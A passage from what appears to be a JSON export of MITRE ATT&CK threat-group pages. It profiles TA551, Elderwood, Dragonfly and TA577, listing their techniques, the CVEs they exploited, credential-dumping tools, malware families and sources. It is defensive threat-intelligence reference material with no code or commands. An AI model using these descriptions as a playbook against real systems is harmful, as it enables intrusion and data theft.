(2022, June 9). Lyceum .NET DNS Backdoor. Retrieved June 23, 2022. GReAT . (2021, April 27). APT trends report Q1 2021. Retrieved June 6, 2022. Microsoft. (2022, June 2). Exposing POLONIUM activity and infrastructure targeting Israeli organizations. Retrieved July 1, 2022. "
},
{
"id": 202,
"title": "TA551, GOLD CABIN, Shathak, Group G0127",
"path": "/groups/G0127/index.html",
"content": " TA551 TA551 is a financially-motivated threat group that has been active since at least 2018. [1] The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. [2] ID: G0127 \u24d8 Associated Groups: GOLD CABIN, Shathak Contributors: Shuhei Sasada, Cyber Defense Institute, Inc; Ryo Tamura, SecureBrain Corporation; Shotaro Hamamoto, NEC Solution Innovators, Ltd; Yusuke Niwa, ITOCHU Corporation; Takuma Matsumoto, LAC Co., Ltd Version: 1.2 Created: 19 March 2021 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description GOLD CABIN [1] Shathak [3][2] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols TA551 has used HTTP for C2 communications.[3] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell TA551 has used cmd.exe to execute commands.[2] Enterprise T1132 .001 Data Encoding: Standard Encoding TA551 has used encoded ASCII text for initial C2 communications.[3] Enterprise T1568 .002 Dynamic Resolution: Domain Generation Algorithms TA551 has used a DGA to generate URLs from executed macros.[2][1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.[2] Enterprise T1105 Ingress Tool Transfer TA551 has retrieved DLLs and installer binaries for malware execution from C2.[2] Enterprise T1036 Masquerading TA551 has masked malware DLLs as dat and jpg files.[2] Enterprise T1027 .003 Obfuscated Files or Information: Steganography TA551 has hidden encoded data for malware DLLs in a PNG.[2] .010 Obfuscated Files or Information: Command Obfuscation TA551 has used obfuscated variable names in a JavaScript configuration file.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment TA551 has sent spearphishing attachments with password protected ZIP files.[3][2][1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta TA551 has used mshta.exe to execute malicious payloads.[2] .010 System Binary Proxy Execution: Regsvr32 TA551 has used regsvr32.exe to load malicious DLLs.[3] .011 System Binary Proxy Execution: Rundll32 TA551 has used rundll32.exe to load malicious DLLs.[2] Enterprise T1204 .002 User Execution: Malicious File TA551 has prompted users to enable macros within spearphishing attachments to install malware.[2] Software ID Name References Techniques S0483 IcedID [4][3][2][1] Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Command and Scripting Interpreter: Visual Basic, Domain Trust Discovery, Drive-by Compromise, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Network Share Discovery, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Software Packing, Permission Groups Discovery, Phishing: Spearphishing Attachment, Process Injection: Process Hollowing, Process Injection: Asynchronous Procedure Call, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion, Windows Management Instrumentation S0650 QakBot [5] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Brute Force, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Dynamic Resolution: Domain Generation Algorithms, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Exploitation of Remote Services, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade File Type, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: HTML Smuggling, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Software Packing, Peripheral Device Discovery, Permission Groups Discovery: Local Groups, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: External Proxy, Remote System Discovery, Replication Through Removable Media, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, Software Discovery, Steal Web Session Cookie, Subvert Trust Controls: Code Signing, Subvert Trust Controls: Mark-of-the-Web Bypass, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation S0633 Sliver [6] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data Obfuscation: Steganography, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Obfuscated Files or Information: Compile After Delivery, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, Process Injection, Proxy: Internal Proxy, Screen Capture, Steal or Forge Kerberos Tickets: Golden Ticket, System Network Configuration Discovery, System Network Connections Discovery S0386 Ursnif [4][3][2][1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Create or Modify System Process: Windows Service, Data Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over C2 Channel, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Inter-Process Communication: Component Object Model, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Command Obfuscation, Process Discovery, Process Injection: Thread Local Storage, Process Injection: Process Hollowing, Proxy: Multi-hop Proxy, Proxy, Query Registry, Replication Through Removable Media, Screen Capture, System Information Discovery, System Service Discovery, Taint Shared Content, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation S0476 Valak [4][3][2][1] Account Discovery: Domain Account, Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Automated Collection, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: PowerShell, Credentials from Password Stores: Windows Credential Manager, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Email Collection: Remote Email Collection, Exfiltration Over C2 Channel, Fallback Channels, Hide Artifacts: NTFS File Attributes, Ingress Tool Transfer, Inter-Process Communication: Dynamic Data Exchange, Modify Registry, Multi-Stage Channels, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Process Discovery, Query Registry, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials in Registry, User Execution: Malicious File, Windows Management Instrumentation References Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021. Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021. Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020. Salem, E. et al. (2020, May 28). VALAK: MORE THAN MEETS THE EYE . Retrieved June 19, 2020. Morrow, D. (2021, April 15). The rise of QakBot. Retrieved September 27, 2021. Cybereason Global SOC and Incident Response Team. (n.d.). Sliver C2 Leveraged by Many Threat Actors. Retrieved March 24, 2025. "
},
{
"id": 203,
"title": "Elderwood, Elderwood Gang, Beijing Group, Sneaky Panda, Group G0066",
"path": "/groups/G0066/index.html",
"content": " Elderwood Elderwood is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. [1] The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers. [2] [3] ID: G0066 \u24d8 Associated Groups: Elderwood Gang, Beijing Group, Sneaky Panda Contributors: Valerii Marchuk, Cybersecurity Help s.r.o. Version: 1.3 Created: 18 April 2018 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Elderwood Gang [2] [3] Beijing Group [3] Sneaky Panda [3] Techniques Used Domain ID Name Use Enterprise T1189 Drive-by Compromise Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.[2][3][1] Enterprise T1203 Exploitation for Client Execution Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.[2] Enterprise T1105 Ingress Tool Transfer The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.[4] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Elderwood has packed malware payloads before delivery to victims.[2] .013 Obfuscated Files or Information: Encrypted/Encoded File Elderwood has encrypted documents and malicious executables.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.[2][3] .002 Phishing: Spearphishing Link Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.[2][3] Enterprise T1204 .001 User Execution: Malicious Link Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links.[2][3] .002 User Execution: Malicious File Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.[2][3] Software ID Name References Techniques S0204 Briba [2] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Ingress Tool Transfer, System Binary Proxy Execution: Rundll32 S0203 Hydraq [2] Access Token Manipulation, Create or Modify System Process: Windows Service, Data from Local System, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Alternative Protocol, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Clear Windows Event Logs, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, Shared Modules, System Information Discovery, System Network Configuration Discovery, System Service Discovery, System Services: Service Execution S0211 Linfo [2] Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Process Discovery, Scheduled Transfer, System Information Discovery S0205 Naid [2] Create or Modify System Process: Windows Service, Modify Registry, System Information Discovery, System Network Configuration Discovery S0210 Nerex [2] Create or Modify System Process: Windows Service, Ingress Tool Transfer, Modify Registry, Subvert Trust Controls: Code Signing S0208 Pasam [2] Boot or Logon Autostart Execution: LSASS Driver, Data from Local System, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Process Discovery, System Information Discovery S0012 PoisonIvy [2] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0207 Vasport [2] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Ingress Tool Transfer, Proxy S0206 Wiarp [2] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Ingress Tool Transfer, Process Injection References Paganini, P. (2012, September 9). Elderwood project, who is behind Op. Aurora and ongoing attacks?. Retrieved February 13, 2018. O'Gorman, G., and McDonald, G.. (2012, September 6). The Elderwood Project. Retrieved November 17, 2024. Clayton, M.. (2012, September 14). Stealing US business secrets: Experts ID two huge cyber 'gangs' in China. Retrieved February 15, 2018. Ladley, F. (2012, May 15). Backdoor.Ritsol. Retrieved February 23, 2018. "
},
{
"id": 204,
"title": "Dragonfly, TEMP.Isotope, DYMALLOY, Berserk Bear, TG-4192, Crouching Yeti, IRON LIBERTY, Energetic Bear, Ghost Blizzard, BROMINE, Group G0035",
"path": "/groups/G0035/index.html",
"content": " Dragonfly Dragonfly is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16.[1][2] Active since at least 2010, Dragonfly has targeted defense and aviation companies, government entities, companies related to industrial control systems, and critical infrastructure sectors worldwide through supply chain, spearphishing, and drive-by compromise attacks.[3][4][5][6][7][8][9] ID: G0035 \u24d8 Associated Groups: TEMP.Isotope, DYMALLOY, Berserk Bear, TG-4192, Crouching Yeti, IRON LIBERTY, Energetic Bear, Ghost Blizzard, BROMINE Contributors: Dragos Threat Intelligence Version: 4.0 Created: 31 May 2017 Last Modified: 08 January 2024 Version Permalink Live Version Associated Group Descriptions Name Description TEMP.Isotope [10][7] DYMALLOY [11][2] Berserk Bear [7][1][2] TG-4192 [4][2] Crouching Yeti [4][7][1][2] IRON LIBERTY [4][12][13][2] Energetic Bear [3][4][12][13][7][1][2] Ghost Blizzard [14] BROMINE [14] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account Dragonfly has used batch scripts to enumerate users on a victim domain controller.[15] Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups Dragonfly has added newly created accounts to the administrators group to maintain elevated access.[15] Enterprise T1583 .001 Acquire Infrastructure: Domains Dragonfly has registered domains for targeting intended victims.[8] .003 Acquire Infrastructure: Virtual Private Server Dragonfly has acquired VPS infrastructure for use in malicious campaigns.[7] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Dragonfly has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.[8] Enterprise T1071 .002 Application Layer Protocol: File Transfer Protocols Dragonfly has used SMB for C2.[15] Enterprise T1560 Archive Collected Data Dragonfly has compressed data into .zip files prior to exfiltration.[15] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Dragonfly has added the registry value ntdll to the Registry Run key to establish persistence.[15] Enterprise T1110 Brute Force Dragonfly has attempted to brute force credentials to gain access.[8] .002 Password Cracking Dragonfly has dropped and executed tools used for password cracking, including Hydra and CrackMapExec.[15][16] Enterprise T1059 Command and Scripting Interpreter Dragonfly has used the command line for execution.[15] .001 PowerShell Dragonfly has used PowerShell scripts for execution.[15][5] .003 Windows Command Shell Dragonfly has used various types of scripting to perform operations, including batch scripts.[15] .006 Python Dragonfly has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.[15] Enterprise T1584 .004 Compromise Infrastructure: Server Dragonfly has compromised legitimate websites to host C2 and malware modules.[7] Enterprise T1136 .001 Create Account: Local Account Dragonfly has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.[15] Enterprise T1005 Data from Local System Dragonfly has collected data from local victim systems.[15] Enterprise T1074 .001 Data Staged: Local Data Staging Dragonfly has created a directory named \"out\" in the user's %AppData% folder and copied files to it.[15] Enterprise T1189 Drive-by Compromise Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.[4][15][7] Enterprise T1114 .002 Email Collection: Remote Email Collection Dragonfly has accessed email accounts using Outlook Web Access.[15] Enterprise T1190 Exploit Public-Facing Application Dragonfly has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.[8] Enterprise T1203 Exploitation for Client Execution Dragonfly has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.[7] Enterprise T1210 Exploitation of Remote Services Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.[8] Enterprise T1133 External Remote Services Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[15][8] Enterprise T1083 File and Directory Discovery Dragonfly has used a batch script to gather folder and file names from victim hosts.[15][7][8] Enterprise T1187 Forced Authentication Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.[15][7] Enterprise T1591 .002 Gather Victim Org Information: Business Relationships Dragonfly has collected open source information to identify relationships between organizations for targeting purposes.[7] Enterprise T1564 .002 Hide Artifacts: Hidden Users Dragonfly has modified the Registry to hide created user accounts.[15] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Dragonfly has disabled host-based firewalls. The group has also globally opened port 3389.[15] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Dragonfly has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.[15] .004 Indicator Removal: File Deletion Dragonfly has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.[15] Enterprise T1105 Ingress Tool Transfer Dragonfly has copied and installed tools for operations once in the victim environment.[15] Enterprise T1036 .010 Masquerading: Masquerade Account Name Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account.[15] Enterprise T1112 Modify Registry Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.[15] Enterprise T1135 Network Share Discovery Dragonfly has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.[15] Enterprise T1588 .002 Obtain Capabilities: Tool Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.[4] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager Dragonfly has dropped and executed SecretsDump to dump password hashes.[15] .003 OS Credential Dumping: NTDS Dragonfly has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.[15][17] .004 OS Credential Dumping: LSA Secrets Dragonfly has dropped and executed SecretsDump to dump password hashes.[15][17] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups Dragonfly has used batch scripts to enumerate administrators and users in the domain.[15] Enterprise T1566 .001 Phishing: Spearphishing Attachment Dragonfly has sent emails with malicious attachments to gain initial access.[7] Enterprise T1598 .002 Phishing for Information: Spearphishing Attachment Dragonfly has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.[15] .003 Phishing for Information: Spearphishing Link Dragonfly has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.[15] Enterprise T1012 Query Registry Dragonfly has queried the Registry to identify victim information.[15] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Dragonfly has moved laterally via RDP.[15] Enterprise T1018 Remote System Discovery Dragonfly has likely obtained a list of hosts in the victim environment.[15] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.[15] Enterprise T1113 Screen Capture Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).[15][5][7] Enterprise T1505 .003 Server Software Component: Web Shell Dragonfly has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.[15] Enterprise T1608 .004 Stage Capabilities: Drive-by Target Dragonfly has compromised websites to redirect traffic and to host exploit kits.[7] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain Dragonfly has placed trojanized installers for control system software on legitimate vendor app stores.[4][7] Enterprise T1016 System Network Configuration Discovery Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.[15] Enterprise T1033 System Owner/User Discovery Dragonfly used the command query user on victim hosts.[15] Enterprise T1221 Template Injection Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.[15] Enterprise T1204 .002 User Execution: Malicious File Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments.[7] Enterprise T1078 Valid Accounts Dragonfly has compromised user credentials and used valid accounts for operations.[15][7][8] ICS T0817 Drive-by Compromise Dragonfly utilized watering hole attacks on energy sector websites by injecting a redirect iframe to deliver Backdoor.Oldrea or Trojan.Karagany. [18] ICS T0862 Supply Chain Compromise Dragonfly trojanized legitimate ICS equipment providers software packages available for download on their websites.[18] Software ID Name References Techniques S0093 Backdoor.Oldrea [3][7] Account Discovery: Email Account, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Denial of Service, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Network Service Discovery, Point & Tag Identification, Process Discovery, Process Injection, Remote System Discovery, Remote System Discovery, Remote System Information Discovery, Spearphishing Attachment, Supply Chain Compromise, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution S0488 CrackMapExec [4][15] Account Discovery: Domain Account, Brute Force: Password Spraying, Brute Force: Password Guessing, Brute Force, Command and Scripting Interpreter: PowerShell, File and Directory Discovery, Modify Registry, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, OS Credential Dumping: LSA Secrets, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0357 Impacket [15][17] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0500 MCMD [12] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Hide Artifacts: Hidden Window, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information, Scheduled Task/Job: Scheduled Task S0002 Mimikatz [4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [15] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh [15] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0029 PsExec [4][15][5][7] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0075 Reg [15] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry S0094 Trojan.Karagany [3][13][7] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Staged: Local Data Staging, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, OS Credential Dumping, Process Discovery, Process Injection: Thread Execution Hijacking, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: System Checks References Department of Justice. (2022, March 24). Four Russian Government Employees Charged in Two Historical Hacking Campaigns Targeting Critical Infrastructure Worldwide. Retrieved April 5, 2022. UK Gov. (2022, April 5). Russia's FSB malign activity: factsheet. Retrieved April 5, 2022. Symantec Security Response. (2014, June 30). Dragonfly: Cyberespionage Attacks Against Energy Suppliers. Retrieved April 8, 2016. Secureworks. (2019, July 24). Resurgent Iron Liberty Targeting Energy Sector. Retrieved August 12, 2020. Symantec Security Response. (2014, July 7). Dragonfly: Western energy sector targeted by sophisticated attack group. Retrieved September 9, 2017. Hackett, R. (2017, September 6). Hackers Have Penetrated Energy Grid, Symantec Warns. Retrieved June 6, 2018. Slowik, J. (2021, October). THE BAFFLING BERSERK BEAR: A DECADE\u2019S ACTIVITY TARGETING CRITICAL INFRASTRUCTURE. Retrieved December 6, 2021. CISA. (2020, December 1). Russian State-Sponsored Advanced Persistent Threat Actor Compromises U.S. Government Targets. Retrieved December 9, 2021. Symantec. (2017, October 7). Dragonfly: Western energy sector targeted by sophisticated attack group. Retrieved April 19, 2022. Hultquist, J. (2022, January 20). Anticipating Cyber Threats as the Ukraine Crisis Escalates. Retrieved January 24, 2022. Dragos. (n.d.). DYMALLOY. Retrieved August 20, 2020. Secureworks. (2019, July 24). MCMD Malware Analysis. Retrieved August 13, 2020. Secureworks. (2019, July 24). Updated Karagany Malware Targets Energy Sector. Retrieved August 12, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. US-CERT. (2018, March 16). Alert (TA18-074A): Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved June 6, 2018. Kali. (2014, February 18). THC-Hydra. Retrieved November 2, 2017. Core Security. (n.d.). Impacket. Retrieved November 2, 2017. Symantec Security Response 2014, July 7 Dragonfly: Cyberespionage Attacks Against Energy Suppliers Retrieved. 2016/04/08 "
},
{
"id": 205,
"title": "TA577, Group G1037",
"path": "/groups/G1037/index.html",
"content": " TA577 TA577 is an initial access broker (IAB) that has distributed QakBot and Pikabot, and was among the first observed groups distributing Latrodectus in 2023.[1] ID: G1037 Version: 1.0 Created: 17 September 2024 Last Modified: 17 September 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell TA577 has used BAT files in malware execution chains.[1] .007 Command and Scripting Interpreter: JavaScript TA577 has used JavaScript to execute additional malicious payloads.[1] Enterprise T1586 .002 Compromise Accounts: Email Accounts TA577 has sent thread hijacked messages from compromised emails.[1] Enterprise T1027 .009 Obfuscated Files or Information: Embedded Payloads TA577 has used LNK files to execute embedded DLLs.[1] Enterprise T1566 .002 Phishing: Spearphishing Link TA577 has sent emails containing links to malicious JavaScript files.[1] Enterprise T1204 .001 User Execution: Malicious Link TA577 has lured users into executing malicious JavaScript files by sending malicious links via email.[1] Software ID Name References Techniques S1160 Latrodectus [1] Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Data Encoding: Standard Encoding, Data from Local System, Debugger Evasion, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: NTFS File Attributes, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Masquerading: Match Legitimate Resource Name or Location, Multi-Stage Channels, Native API, Network Share Discovery, Obfuscated Files or Information: Dynamic API Resolution, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery: Domain Groups, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Process Discovery, Remote Services: VNC, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Msiexec, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Shutdown/Reboot, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Web Service, Windows Management Instrumentation S1145 Pikabot [1] Account Discovery: Local Account, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Debugger Evasion, Deobfuscate/Decode Files or Information, Domain Trust Discovery, 